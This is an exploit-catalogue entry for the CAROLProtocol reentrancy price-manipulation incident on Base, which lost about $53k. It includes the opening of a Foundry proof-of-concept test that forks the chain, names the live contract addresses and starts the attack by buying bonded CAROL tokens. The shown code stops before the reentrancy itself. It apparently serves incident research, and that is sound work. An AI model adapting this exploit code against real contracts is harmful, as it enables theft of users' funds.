# [?] CAROLProtocol - Price Manipulation Via Reentrancy

## Summary
Severity: Unknown
Chain: Base
Component: CAROLProtocol
Published: 2023-11-30
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/CAROLProtocol_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$53k

```solidity
contract ContractTest is Test {
    ICAROLProtocol private constant CAROLProtocol = ICAROLProtocol(0x26fe408BbD7A490fEB056DA8e2D1e007938E5685);
    IWETH private constant WETH = IWETH(payable(0x4200000000000000000000000000000000000006));
    ISynapseETHPools private constant SynapseETHPools = ISynapseETHPools(0x6223bD82010E2fB69F329933De20897e7a4C225f);
    IBalancerVault private constant BalancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IKokonut private constant Kokonut = IKokonut(0x73c3A78E5FF0d216a50b11D51B262ca839FCfe17);
    Uni_Pair_V3 private constant WETH_USDbCV3 = Uni_Pair_V3(0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18);
    Uni_Pair_V2 private constant WETH_USDbCV2 = Uni_Pair_V2(0xB4885Bc63399BF5518b994c1d0C153334Ee579D0);
    Uni_Router_V2 private constant Router = Uni_Router_V2(0x327Df1E6de05895d2ab08513aaDD9313Fe505d86);
    IERC20 private constant CAROL = IERC20(0x4A0a76645941d8C7ba059940B3446228F0DB8972);
    uint256 private constant blocknumToForkFrom = 7_246_080;

    bool withdrawingWETH;

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        vm.label(address(CAROLProtocol), "CAROLProtocol");
        vm.label(address(WETH), "WETH");
        vm.label(address(SynapseETHPools), "SynapseETHPools");
        vm.label(address(BalancerVault), "BalancerVault");
        vm.label(address(Kokonut), "Kokonut");
        vm.label(address(WETH_USDbCV3), "WETH_USDbCV3");
        vm.label(address(WETH_USDbCV2), "WETH_USDbCV2");
        vm.label(address(Router), "Router");
        vm.label(address(CAROL), "CAROL");
    }

    function testExploit() public {
        // Prepare tx:
        // Start with following ETH balance
        deal(address(this), 0.07 ether);
        emit log_named_decimal_uint("Exploiter ETH balance before attack", address(this).balance, 18);
        // Buy CAROL tokens with ETH through bonding. Create active 'Bond'
        CAROLProtocol.buy{value: 0.03 ether}(address(this), 0);
        // Use remaining ETH and CAROL tokens from active 'Bond' for liquidity staking in WETH_CAROL pair
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-11/CAROLProtocol_exp.sol_
